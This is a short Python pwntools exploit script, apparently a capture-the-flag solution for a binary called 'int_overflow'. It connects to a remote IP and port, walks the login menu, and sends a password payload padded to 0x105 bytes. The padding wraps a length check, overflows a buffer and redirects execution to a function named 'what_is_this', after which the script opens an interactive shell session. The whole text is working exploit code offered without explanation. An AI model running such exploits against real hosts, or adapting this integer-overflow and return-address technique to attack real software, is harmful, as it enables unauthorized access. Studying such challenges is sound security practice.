from pwn import *

# p = process("./int_overflow")
p = remote("111.198.29.45" , 30881)
elf = ELF("./int_overflow")

p.sendlineafter("choice:" , "1")
p.sendlineafter("username:\n" , "fantasy")

payload = ("a" * 5 + "\n").ljust(0x14 , "a") + "b" * 4 + p32(elf.sym["what_is_this"])
payload = payload.ljust(0x105 , "a")
p.sendlineafter("passwd:\n" , payload )
p.interactive()